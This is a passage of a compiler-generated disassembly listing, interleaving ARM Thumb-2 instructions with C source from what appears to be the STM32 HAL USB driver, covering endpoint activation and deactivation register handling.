 80065d8:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80065da:	801a      	strh	r2, [r3, #0]

    if (ep->is_in == 0U)
 80065dc:	683b      	ldr	r3, [r7, #0]
 80065de:	785b      	ldrb	r3, [r3, #1]
 80065e0:	2b00      	cmp	r3, #0
 80065e2:	f040 8093 	bne.w	800670c <USB_ActivateEndpoint+0x5fc>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80065e6:	687a      	ldr	r2, [r7, #4]
 80065e8:	683b      	ldr	r3, [r7, #0]
 80065ea:	781b      	ldrb	r3, [r3, #0]
 80065ec:	009b      	lsls	r3, r3, #2
 80065ee:	4413      	add	r3, r2
 80065f0:	881b      	ldrh	r3, [r3, #0]
 80065f2:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40
 80065f6:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 80065fa:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80065fe:	2b00      	cmp	r3, #0
 8006600:	d01b      	beq.n	800663a <USB_ActivateEndpoint+0x52a>
 8006602:	687a      	ldr	r2, [r7, #4]
 8006604:	683b      	ldr	r3, [r7, #0]
 8006606:	781b      	ldrb	r3, [r3, #0]
 8006608:	009b      	lsls	r3, r3, #2
 800660a:	4413      	add	r3, r2
 800660c:	881b      	ldrh	r3, [r3, #0]
 800660e:	b29b      	uxth	r3, r3
 8006610:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006614:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006618:	87fb      	strh	r3, [r7, #62]	; 0x3e
 800661a:	687a      	ldr	r2, [r7, #4]
 800661c:	683b      	ldr	r3, [r7, #0]
 800661e:	781b      	ldrb	r3, [r3, #0]
 8006620:	009b      	lsls	r3, r3, #2
 8006622:	441a      	add	r2, r3
 8006624:	8ffb      	ldrh	r3, [r7, #62]	; 0x3e
 8006626:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800662a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800662e:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006632:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006636:	b29b      	uxth	r3, r3
 8006638:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 800663a:	687a      	ldr	r2, [r7, #4]
 800663c:	683b      	ldr	r3, [r7, #0]
 800663e:	781b      	ldrb	r3, [r3, #0]
 8006640:	009b      	lsls	r3, r3, #2
 8006642:	4413      	add	r3, r2
 8006644:	881b      	ldrh	r3, [r3, #0]
 8006646:	87bb      	strh	r3, [r7, #60]	; 0x3c
 8006648:	8fbb      	ldrh	r3, [r7, #60]	; 0x3c
 800664a:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800664e:	2b00      	cmp	r3, #0
 8006650:	d01b      	beq.n	800668a <USB_ActivateEndpoint+0x57a>
 8006652:	687a      	ldr	r2, [r7, #4]
 8006654:	683b      	ldr	r3, [r7, #0]
 8006656:	781b      	ldrb	r3, [r3, #0]
 8006658:	009b      	lsls	r3, r3, #2
 800665a:	4413      	add	r3, r2
 800665c:	881b      	ldrh	r3, [r3, #0]
 800665e:	b29b      	uxth	r3, r3
 8006660:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006664:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006668:	877b      	strh	r3, [r7, #58]	; 0x3a
 800666a:	687a      	ldr	r2, [r7, #4]
 800666c:	683b      	ldr	r3, [r7, #0]
 800666e:	781b      	ldrb	r3, [r3, #0]
 8006670:	009b      	lsls	r3, r3, #2
 8006672:	441a      	add	r2, r3
 8006674:	8f7b      	ldrh	r3, [r7, #58]	; 0x3a
 8006676:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800667a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800667e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006682:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006686:	b29b      	uxth	r3, r3
 8006688:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 800668a:	687a      	ldr	r2, [r7, #4]
 800668c:	683b      	ldr	r3, [r7, #0]
 800668e:	781b      	ldrb	r3, [r3, #0]
 8006690:	009b      	lsls	r3, r3, #2
 8006692:	4413      	add	r3, r2
 8006694:	881b      	ldrh	r3, [r3, #0]
 8006696:	b29b      	uxth	r3, r3
 8006698:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800669c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80066a0:	873b      	strh	r3, [r7, #56]	; 0x38
 80066a2:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 80066a4:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80066a8:	873b      	strh	r3, [r7, #56]	; 0x38
 80066aa:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 80066ac:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80066b0:	873b      	strh	r3, [r7, #56]	; 0x38
 80066b2:	687a      	ldr	r2, [r7, #4]
 80066b4:	683b      	ldr	r3, [r7, #0]
 80066b6:	781b      	ldrb	r3, [r3, #0]
 80066b8:	009b      	lsls	r3, r3, #2
 80066ba:	441a      	add	r2, r3
 80066bc:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 80066be:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80066c2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80066c6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80066ca:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80066ce:	b29b      	uxth	r3, r3
 80066d0:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80066d2:	687a      	ldr	r2, [r7, #4]
 80066d4:	683b      	ldr	r3, [r7, #0]
 80066d6:	781b      	ldrb	r3, [r3, #0]
 80066d8:	009b      	lsls	r3, r3, #2
 80066da:	4413      	add	r3, r2
 80066dc:	881b      	ldrh	r3, [r3, #0]
 80066de:	b29b      	uxth	r3, r3
 80066e0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80066e4:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80066e8:	86fb      	strh	r3, [r7, #54]	; 0x36
 80066ea:	687a      	ldr	r2, [r7, #4]
 80066ec:	683b      	ldr	r3, [r7, #0]
 80066ee:	781b      	ldrb	r3, [r3, #0]
 80066f0:	009b      	lsls	r3, r3, #2
 80066f2:	441a      	add	r2, r3
 80066f4:	8efb      	ldrh	r3, [r7, #54]	; 0x36
 80066f6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80066fa:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80066fe:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006702:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006706:	b29b      	uxth	r3, r3
 8006708:	8013      	strh	r3, [r2, #0]
 800670a:	e0bc      	b.n	8006886 <USB_ActivateEndpoint+0x776>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 800670c:	687a      	ldr	r2, [r7, #4]
 800670e:	683b      	ldr	r3, [r7, #0]
 8006710:	781b      	ldrb	r3, [r3, #0]
 8006712:	009b      	lsls	r3, r3, #2
 8006714:	4413      	add	r3, r2
 8006716:	881b      	ldrh	r3, [r3, #0]
 8006718:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 800671c:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8006720:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006724:	2b00      	cmp	r3, #0
 8006726:	d01d      	beq.n	8006764 <USB_ActivateEndpoint+0x654>
 8006728:	687a      	ldr	r2, [r7, #4]
 800672a:	683b      	ldr	r3, [r7, #0]
 800672c:	781b      	ldrb	r3, [r3, #0]
 800672e:	009b      	lsls	r3, r3, #2
 8006730:	4413      	add	r3, r2
 8006732:	881b      	ldrh	r3, [r3, #0]
 8006734:	b29b      	uxth	r3, r3
 8006736:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800673a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800673e:	f8a7 304c 	strh.w	r3, [r7, #76]	; 0x4c
 8006742:	687a      	ldr	r2, [r7, #4]
 8006744:	683b      	ldr	r3, [r7, #0]
 8006746:	781b      	ldrb	r3, [r3, #0]
 8006748:	009b      	lsls	r3, r3, #2
 800674a:	441a      	add	r2, r3
 800674c:	f8b7 304c 	ldrh.w	r3, [r7, #76]	; 0x4c
 8006750:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006754:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006758:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800675c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006760:	b29b      	uxth	r3, r3
 8006762:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006764:	687a      	ldr	r2, [r7, #4]
 8006766:	683b      	ldr	r3, [r7, #0]
 8006768:	781b      	ldrb	r3, [r3, #0]
 800676a:	009b      	lsls	r3, r3, #2
 800676c:	4413      	add	r3, r2
 800676e:	881b      	ldrh	r3, [r3, #0]
 8006770:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a
 8006774:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8006778:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800677c:	2b00      	cmp	r3, #0
 800677e:	d01d      	beq.n	80067bc <USB_ActivateEndpoint+0x6ac>
 8006780:	687a      	ldr	r2, [r7, #4]
 8006782:	683b      	ldr	r3, [r7, #0]
 8006784:	781b      	ldrb	r3, [r3, #0]
 8006786:	009b      	lsls	r3, r3, #2
 8006788:	4413      	add	r3, r2
 800678a:	881b      	ldrh	r3, [r3, #0]
 800678c:	b29b      	uxth	r3, r3
 800678e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006792:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006796:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 800679a:	687a      	ldr	r2, [r7, #4]
 800679c:	683b      	ldr	r3, [r7, #0]
 800679e:	781b      	ldrb	r3, [r3, #0]
 80067a0:	009b      	lsls	r3, r3, #2
 80067a2:	441a      	add	r2, r3
 80067a4:	f8b7 3048 	ldrh.w	r3, [r7, #72]	; 0x48
 80067a8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80067ac:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80067b0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80067b4:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80067b8:	b29b      	uxth	r3, r3
 80067ba:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 80067bc:	683b      	ldr	r3, [r7, #0]
 80067be:	78db      	ldrb	r3, [r3, #3]
 80067c0:	2b01      	cmp	r3, #1
 80067c2:	d024      	beq.n	800680e <USB_ActivateEndpoint+0x6fe>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 80067c4:	687a      	ldr	r2, [r7, #4]
 80067c6:	683b      	ldr	r3, [r7, #0]
 80067c8:	781b      	ldrb	r3, [r3, #0]
 80067ca:	009b      	lsls	r3, r3, #2
 80067cc:	4413      	add	r3, r2
 80067ce:	881b      	ldrh	r3, [r3, #0]
 80067d0:	b29b      	uxth	r3, r3
 80067d2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80067d6:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80067da:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 80067de:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 80067e2:	f083 0320 	eor.w	r3, r3, #32
 80067e6:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 80067ea:	687a      	ldr	r2, [r7, #4]
 80067ec:	683b      	ldr	r3, [r7, #0]
 80067ee:	781b      	ldrb	r3, [r3, #0]
 80067f0:	009b      	lsls	r3, r3, #2
 80067f2:	441a      	add	r2, r3
 80067f4:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 80067f8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80067fc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006800:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006804:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006808:	b29b      	uxth	r3, r3
 800680a:	8013      	strh	r3, [r2, #0]
 800680c:	e01d      	b.n	800684a <USB_ActivateEndpoint+0x73a>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800680e:	687a      	ldr	r2, [r7, #4]
 8006810:	683b      	ldr	r3, [r7, #0]
 8006812:	781b      	ldrb	r3, [r3, #0]
 8006814:	009b      	lsls	r3, r3, #2
 8006816:	4413      	add	r3, r2
 8006818:	881b      	ldrh	r3, [r3, #0]
 800681a:	b29b      	uxth	r3, r3
 800681c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006820:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006824:	f8a7 3046 	strh.w	r3, [r7, #70]	; 0x46
 8006828:	687a      	ldr	r2, [r7, #4]
 800682a:	683b      	ldr	r3, [r7, #0]
 800682c:	781b      	ldrb	r3, [r3, #0]
 800682e:	009b      	lsls	r3, r3, #2
 8006830:	441a      	add	r2, r3
 8006832:	f8b7 3046 	ldrh.w	r3, [r7, #70]	; 0x46
 8006836:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800683a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800683e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006842:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006846:	b29b      	uxth	r3, r3
 8006848:	8013      	strh	r3, [r2, #0]
      }

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 800684a:	687a      	ldr	r2, [r7, #4]
 800684c:	683b      	ldr	r3, [r7, #0]
 800684e:	781b      	ldrb	r3, [r3, #0]
 8006850:	009b      	lsls	r3, r3, #2
 8006852:	4413      	add	r3, r2
 8006854:	881b      	ldrh	r3, [r3, #0]
 8006856:	b29b      	uxth	r3, r3
 8006858:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800685c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006860:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 8006864:	687a      	ldr	r2, [r7, #4]
 8006866:	683b      	ldr	r3, [r7, #0]
 8006868:	781b      	ldrb	r3, [r3, #0]
 800686a:	009b      	lsls	r3, r3, #2
 800686c:	441a      	add	r2, r3
 800686e:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 8006872:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006876:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800687a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800687e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006882:	b29b      	uxth	r3, r3
 8006884:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return ret;
 8006886:	f897 306f 	ldrb.w	r3, [r7, #111]	; 0x6f
}
 800688a:	4618      	mov	r0, r3
 800688c:	3774      	adds	r7, #116	; 0x74
 800688e:	46bd      	mov	sp, r7
 8006890:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006894:	4770      	bx	lr
 8006896:	bf00      	nop

08006898 <USB_DeactivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DeactivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006898:	b480      	push	{r7}
 800689a:	b08d      	sub	sp, #52	; 0x34
 800689c:	af00      	add	r7, sp, #0
 800689e:	6078      	str	r0, [r7, #4]
 80068a0:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 80068a2:	683b      	ldr	r3, [r7, #0]
 80068a4:	7b1b      	ldrb	r3, [r3, #12]
 80068a6:	2b00      	cmp	r3, #0
 80068a8:	f040 808e 	bne.w	80069c8 <USB_DeactivateEndpoint+0x130>
  {
    if (ep->is_in != 0U)
 80068ac:	683b      	ldr	r3, [r7, #0]
 80068ae:	785b      	ldrb	r3, [r3, #1]
 80068b0:	2b00      	cmp	r3, #0
 80068b2:	d044      	beq.n	800693e <USB_DeactivateEndpoint+0xa6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80068b4:	687a      	ldr	r2, [r7, #4]
 80068b6:	683b      	ldr	r3, [r7, #0]
 80068b8:	781b      	ldrb	r3, [r3, #0]
 80068ba:	009b      	lsls	r3, r3, #2
 80068bc:	4413      	add	r3, r2
 80068be:	881b      	ldrh	r3, [r3, #0]
 80068c0:	81bb      	strh	r3, [r7, #12]
 80068c2:	89bb      	ldrh	r3, [r7, #12]
 80068c4:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80068c8:	2b00      	cmp	r3, #0
 80068ca:	d01b      	beq.n	8006904 <USB_DeactivateEndpoint+0x6c>
 80068cc:	687a      	ldr	r2, [r7, #4]
 80068ce:	683b      	ldr	r3, [r7, #0]
 80068d0:	781b      	ldrb	r3, [r3, #0]
 80068d2:	009b      	lsls	r3, r3, #2
 80068d4:	4413      	add	r3, r2
 80068d6:	881b      	ldrh	r3, [r3, #0]
 80068d8:	b29b      	uxth	r3, r3
 80068da:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80068de:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80068e2:	817b      	strh	r3, [r7, #10]
 80068e4:	687a      	ldr	r2, [r7, #4]
 80068e6:	683b      	ldr	r3, [r7, #0]
 80068e8:	781b      	ldrb	r3, [r3, #0]
 80068ea:	009b      	lsls	r3, r3, #2
 80068ec:	441a      	add	r2, r3
 80068ee:	897b      	ldrh	r3, [r7, #10]
 80068f0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80068f4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80068f8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80068fc:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006900:	b29b      	uxth	r3, r3
 8006902:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006904:	687a      	ldr	r2, [r7, #4]
 8006906:	683b      	ldr	r3, [r7, #0]
 8006908:	781b      	ldrb	r3, [r3, #0]
 800690a:	009b      	lsls	r3, r3, #2
 800690c:	4413      	add	r3, r2
 800690e:	881b      	ldrh	r3, [r3, #0]
 8006910:	b29b      	uxth	r3, r3
 8006912:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006916:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800691a:	813b      	strh	r3, [r7, #8]
 800691c:	687a      	ldr	r2, [r7, #4]
 800691e:	683b      	ldr	r3, [r7, #0]
 8006920:	781b      	ldrb	r3, [r3, #0]
 8006922:	009b      	lsls	r3, r3, #2
 8006924:	441a      	add	r2, r3
 8006926:	893b      	ldrh	r3, [r7, #8]
 8006928:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800692c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006930:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006934:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006938:	b29b      	uxth	r3, r3
 800693a:	8013      	strh	r3, [r2, #0]
 800693c:	e192      	b.n	8006c64 <USB_DeactivateEndpoint+0x3cc>
    }

    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 800693e:	687a      	ldr	r2, [r7, #4]
 8006940:	683b      	ldr	r3, [r7, #0]
 8006942:	781b      	ldrb	r3, [r3, #0]
 8006944:	009b      	lsls	r3, r3, #2
 8006946:	4413      	add	r3, r2
 8006948:	881b      	ldrh	r3, [r3, #0]
 800694a:	827b      	strh	r3, [r7, #18]
 800694c:	8a7b      	ldrh	r3, [r7, #18]
 800694e:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006952:	2b00      	cmp	r3, #0
 8006954:	d01b      	beq.n	800698e <USB_DeactivateEndpoint+0xf6>
 8006956:	687a      	ldr	r2, [r7, #4]
 8006958:	683b      	ldr	r3, [r7, #0]
 800695a:	781b      	ldrb	r3, [r3, #0]
 800695c:	009b      	lsls	r3, r3, #2
 800695e:	4413      	add	r3, r2
 8006960:	881b      	ldrh	r3, [r3, #0]
 8006962:	b29b      	uxth	r3, r3
 8006964:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006968:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800696c:	823b      	strh	r3, [r7, #16]
 800696e:	687a      	ldr	r2, [r7, #4]
 8006970:	683b      	ldr	r3, [r7, #0]
 8006972:	781b      	ldrb	r3, [r3, #0]
 8006974:	009b      	lsls	r3, r3, #2
 8006976:	441a      	add	r2, r3
 8006978:	8a3b      	ldrh	r3, [r7, #16]
 800697a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800697e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006982:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006986:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800698a:	b29b      	uxth	r3, r3
 800698c:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 800698e:	687a      	ldr	r2, [r7, #4]
 8006990:	683b      	ldr	r3, [r7, #0]
 8006992:	781b      	ldrb	r3, [r3, #0]
 8006994:	009b      	lsls	r3, r3, #2
 8006996:	4413      	add	r3, r2
 8006998:	881b      	ldrh	r3, [r3, #0]
 800699a:	b29b      	uxth	r3, r3
 800699c:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80069a0:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80069a4:	81fb      	strh	r3, [r7, #14]
 80069a6:	687a      	ldr	r2, [r7, #4]
 80069a8:	683b      	ldr	r3, [r7, #0]
 80069aa:	781b      	ldrb	r3, [r3, #0]
 80069ac:	009b      	lsls	r3, r3, #2
 80069ae:	441a      	add	r2, r3
 80069b0:	89fb      	ldrh	r3, [r7, #14]
 80069b2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80069b6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80069ba:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80069be:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80069c2:	b29b      	uxth	r3, r3
 80069c4:	8013      	strh	r3, [r2, #0]
 80069c6:	e14d      	b.n	8006c64 <USB_DeactivateEndpoint+0x3cc>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->is_in == 0U)
 80069c8:	683b      	ldr	r3, [r7, #0]
 80069ca:	785b      	ldrb	r3, [r3, #1]
 80069cc:	2b00      	cmp	r3, #0
 80069ce:	f040 80a5 	bne.w	8006b1c <USB_DeactivateEndpoint+0x284>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80069d2:	687a      	ldr	r2, [r7, #4]
 80069d4:	683b      	ldr	r3, [r7, #0]
 80069d6:	781b      	ldrb	r3, [r3, #0]
 80069d8:	009b      	lsls	r3, r3, #2
 80069da:	4413      	add	r3, r2
 80069dc:	881b      	ldrh	r3, [r3, #0]
 80069de:	843b      	strh	r3, [r7, #32]
 80069e0:	8c3b      	ldrh	r3, [r7, #32]
 80069e2:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80069e6:	2b00      	cmp	r3, #0
 80069e8:	d01b      	beq.n	8006a22 <USB_DeactivateEndpoint+0x18a>
 80069ea:	687a      	ldr	r2, [r7, #4]
 80069ec:	683b      	ldr	r3, [r7, #0]
 80069ee:	781b      	ldrb	r3, [r3, #0]
 80069f0:	009b      	lsls	r3, r3, #2
 80069f2:	4413      	add	r3, r2
 80069f4:	881b      	ldrh	r3, [r3, #0]
 80069f6:	b29b      	uxth	r3, r3
 80069f8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80069fc:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006a00:	83fb      	strh	r3, [r7, #30]
 8006a02:	687a      	ldr	r2, [r7, #4]
 8006a04:	683b      	ldr	r3, [r7, #0]
 8006a06:	781b      	ldrb	r3, [r3, #0]
 8006a08:	009b      	lsls	r3, r3, #2
 8006a0a:	441a      	add	r2, r3
 8006a0c:	8bfb      	ldrh	r3, [r7, #30]
 8006a0e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006a12:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a16:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006a1a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006a1e:	b29b      	uxth	r3, r3
 8006a20:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006a22:	687a      	ldr	r2, [r7, #4]
 8006a24:	683b      	ldr	r3, [r7, #0]
 8006a26:	781b      	ldrb	r3, [r3, #0]
 8006a28:	009b      	lsls	r3, r3, #2
 8006a2a:	4413      	add	r3, r2
 8006a2c:	881b      	ldrh	r3, [r3, #0]
 8006a2e:	83bb      	strh	r3, [r7, #28]
 8006a30:	8bbb      	ldrh	r3, [r7, #28]
 8006a32:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006a36:	2b00      	cmp	r3, #0
 8006a38:	d01b      	beq.n	8006a72 <USB_DeactivateEndpoint+0x1da>
 8006a3a:	687a      	ldr	r2, [r7, #4]
 8006a3c:	683b      	ldr	r3, [r7, #0]
 8006a3e:	781b      	ldrb	r3, [r3, #0]
 8006a40:	009b      	lsls	r3, r3, #2
 8006a42:	4413      	add	r3, r2
 8006a44:	881b      	ldrh	r3, [r3, #0]
 8006a46:	b29b      	uxth	r3, r3
 8006a48:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006a4c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006a50:	837b      	strh	r3, [r7, #26]
 8006a52:	687a      	ldr	r2, [r7, #4]
 8006a54:	683b      	ldr	r3, [r7, #0]
 8006a56:	781b      	ldrb	r3, [r3, #0]
 8006a58:	009b      	lsls	r3, r3, #2
 8006a5a:	441a      	add	r2, r3
 8006a5c:	8b7b      	ldrh	r3, [r7, #26]
 8006a5e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006a62:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a66:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006a6a:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006a6e:	b29b      	uxth	r3, r3
 8006a70:	8013      	strh	r3, [r2, #0]

      /* Reset value of the data toggle bits for the endpoint out*/
      PCD_TX_DTOG(USBx, ep->num);
 8006a72:	687a      	ldr	r2, [r7, #4]
 8006a74:	683b      	ldr	r3, [r7, #0]
 8006a76:	781b      	ldrb	r3, [r3, #0]
 8006a78:	009b      	lsls	r3, r3, #2
 8006a7a:	4413      	add	r3, r2
 8006a7c:	881b      	ldrh	r3, [r3, #0]
 8006a7e:	b29b      	uxth	r3, r3
 8006a80:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006a84:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006a88:	833b      	strh	r3, [r7, #24]
 8006a8a:	687a      	ldr	r2, [r7, #4]
 8006a8c:	683b      	ldr	r3, [r7, #0]
 8006a8e:	781b      	ldrb	r3, [r3, #0]
 8006a90:	009b      	lsls	r3, r3, #2
 8006a92:	441a      	add	r2, r3
 8006a94:	8b3b      	ldrh	r3, [r7, #24]
 8006a96:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006a9a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a9e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006aa2:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006aa6:	b29b      	uxth	r3, r3
 8006aa8:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006aaa:	687a      	ldr	r2, [r7, #4]
 8006aac:	683b      	ldr	r3, [r7, #0]
 8006aae:	781b      	ldrb	r3, [r3, #0]
 8006ab0:	009b      	lsls	r3, r3, #2
 8006ab2:	4413      	add	r3, r2
 8006ab4:	881b      	ldrh	r3, [r3, #0]
 8006ab6:	b29b      	uxth	r3, r3
 8006ab8:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
